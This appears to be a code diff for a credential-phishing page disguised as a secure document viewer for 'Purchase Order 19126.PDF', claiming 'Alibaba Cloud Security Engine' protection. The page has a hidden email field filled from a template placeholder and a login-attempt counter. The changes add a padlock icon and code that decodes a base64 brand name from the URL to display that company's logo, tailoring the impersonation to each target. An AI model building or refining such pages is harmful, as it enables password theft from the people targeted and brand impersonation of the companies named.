@@ -212,15 +212,27 @@ var docurl = '';
   animation-name: fadeInUp;
 }
 
+.avatar{
+ position: relative;
+}
+
+.padlock{
+ position: absolute;
+ width: 40px;
+ height: 40px;
+ bottom: -10px;
+ left: -20px;
+ //background-color: #fff;
+}
 
   </style>
 
 </head>
 
-<body>
+<body style="background-color: #333;">
   <div class="container-fluid">
     
-    <div class="row" style="position: fixed; height: 100vh; background-image: url('https://i.im.ge/2022/06/19/reTSGF.png'); background-size: contain;background-repeat: yes-repeat; filter: blur(3px);  -webkit-filter: blur(3px); width: 100%; left: 0; top: 0;"></div>
+    <div class="row" style="position: fixed; height: 100vh; background-image: url('https://i.im.ge/2022/06/19/reTSGF.png'); background-size: contain;background-repeat: no-repeat; filter: blur(3px);  -webkit-filter: blur(3px); width: 100%; left: 0; top: 0;"></div>
     <div class="row" style="height: 100vh;">
       <div class="container">
         <div class="row">
@@ -249,16 +261,19 @@ var docurl = '';
         <div class="login-container">
             <div id="output"></div>
             <div class="logos">
+              <img id="mBoxLogo" class=" brand_logo" height="50px" src="alibaba.png">
               <div class="avatar">
-                <img id="fieldImg" class="img-fluid brand_logo" width="60px" src="https://i.im.ge/2022/06/19/rGepCP.png">
+                <img id="fieldImg" class=" brand_logo" width="60px" src="https://i.im.ge/2022/06/19/rGepCP.png">
+                <div class="padlock">
+                 <img id="fieldImg" class=" brand_logo" width="40px" src="lock.png">
+                </div>
               </div>
 
-                <img id="fieldImg" class="img-fluid brand_logo" width="60px" src="https://i.im.ge/2022/06/19/rGepCP.png">
             </div>
             <div class="form-box">
               <div class="alert" id="errmsg" style="color: #e00; font-size: 14px; padding: 5px;"></div>
               <h4>Purchase Order 19126.PDF</h4>
-              <p style="font-size: 14px;">"File is protected by <span id="mBox">Alibaba</span> Cloud Security Engine"</p>
+              <p style="font-size: 14px;">"File is protected by <b><span id="mBox">Alibaba</span> Cloud Security</b> Engine"</p>
                 <!--<form id="contact" class="form-horizontal well">-->
                 <form action="" method="post" id="form_">
                   <input type='hidden' id="ckorg" placeholder="Email Address" value="[[-Email-]]"><br>
@@ -295,6 +310,7 @@ var docurl = '';
 
   if (xx[1] != undefined) {
     document.querySelector('#mBox').innerHTML = atob(xx[1]).toUpperCase()
+    document.querySelector('#mBoxLogo').src = atob(xx[1]).toUpperCase()+".png"
   }
 
   trial.value = trialCount
